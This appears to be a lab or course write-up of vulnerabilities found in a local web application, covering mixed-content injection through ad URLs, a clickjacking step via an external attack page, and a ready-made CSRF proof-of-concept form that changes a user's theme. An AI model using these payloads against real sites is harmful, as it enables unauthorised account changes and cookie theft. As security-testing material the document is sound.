========== Class of Vulnerability: mixed content (23) ==========
* Goal: inject http content into https content
* Exploit verification: the attacker ables to embed http page he wish into the https page in the server. In this case, the attacker HTTP content will be displayed in the ads iframe.
* Exploit steps: 
1) Go to https://localhost/users/login.
Email: user0@email.com
Password: passw0rd
2) Go to https://localhost/ads/create
3) Enter:
Title: any
Url: http://kompas.com
or http://localhost/
Budget: 10
Description: test

* Specify how to run attack automation tool (if applicable):
None

* Set up a malicious web application as a bait (if applicable)
We don't need to prepare this as the intention is to open a vulnerability for another attack such as Man In the Middle.
When the ads is set to http://localhost/, the Man in Middle Attack can get the cookie in a plain form!

* State any secrets you keep in your web application (if applicable)
None

========== Class of Vulnerability: CSRF with no token (13) ==========
<html>
  <body>
    <form method="POST" action="https://localhost/themes/154" accept-charset="UTF-8" role="form">
    <input name="_method" type="hidden" value="PUT">
    <input name="theme" type="hidden" value="cupid">
    <input type="submit" value="Click me :D">          
    </form>
  </body>
</html>

========== Class of Vulnerability: Clickjacking ========
1) Add new adds:
URL: http://astrospace-attack.herokuapp.com/attacks/clickjacking/ip=myip
Change myip with the IP of host (e.g. localhost, 127.0.0.1)

2) See the ads below the page. Click the link